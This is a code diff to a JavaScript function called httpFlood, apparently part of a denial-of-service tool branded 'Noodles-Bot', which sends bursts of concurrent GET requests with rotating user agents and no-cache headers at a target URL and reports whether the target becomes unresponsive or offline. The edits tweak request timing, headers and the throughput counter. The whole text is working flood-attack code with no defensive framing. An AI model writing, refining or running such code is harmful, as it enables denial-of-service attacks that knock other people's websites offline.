@@ -8,16 +8,9 @@ async function httpFlood(target, duration, intensity) {
     const url = new URL(target);
     const host = url.hostname;
     const path = url.pathname || '/';
-    let port = url.port;
-
-    if (!port) {
-      port = url.protocol === 'https:' ? 443 : 80;
-    } else {
-      port = parseInt(port, 10);
-    }
 
     const protocol = url.protocol === 'https:' ? 'https' : 'http';
-    const interval = Math.max(1, 50 / intensity);
+    const interval = Math.max(1, 100 / intensity);
 
     const userAgents = [
       'Noodles-Bot v3.0',
@@ -31,23 +24,20 @@ async function httpFlood(target, duration, intensity) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
         const promise = fetch(target, {
             method: 'GET',
             headers: {
               'User-Agent': userAgent,
-              'X-Noodles-Bot': 'Active',
               'Cache-Control': 'no-cache',
               'Connection': 'keep-alive'
             },
             mode: 'no-cors'
           })
           .then(response => {
-            if (response.ok) {
-              packetsSent++;
-              mbps += payload.length / 1000000;
-            } else {
+            packetsSent++;
+            mbps += 0.001;
+            if (!response.ok) {
               targetStatus = 'Unresponsive';
             }
           })
@@ -64,7 +54,7 @@ async function httpFlood(target, duration, intensity) {
     targetStatus = 'Offline';
   }
 
-  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
+  mbps = mbps / ((Date.now() - startTime) / 1000);
   return { packetsSent, targetStatus, mbps };
 }
 
